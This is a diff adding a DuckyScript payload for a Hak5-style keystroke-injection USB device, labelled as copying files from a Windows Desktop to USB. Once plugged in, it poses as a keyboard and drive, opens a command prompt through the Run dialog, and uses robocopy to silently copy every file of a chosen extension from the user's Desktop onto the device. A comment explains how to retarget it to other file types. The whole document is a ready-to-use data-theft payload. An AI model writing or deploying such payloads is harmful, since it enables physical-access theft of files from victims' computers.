@@ -1,0 +1,17 @@
+REM Copy any file type from Desktop to USB (Windows)
+REM Author: Sean Chow
+
+ATTACKMODE HID STORAGE
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+REM Replace txt with any file extension (ex. .pdf, .py, .doc, .html, .xlsx, .csv, .png, .jpeg, etc) and change path to correct path address
+STRING robocopy "%USERPROFILE%\OneDrive\Desktop" "F:\Files" *.txt /S
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+ATTACKMODE OFF
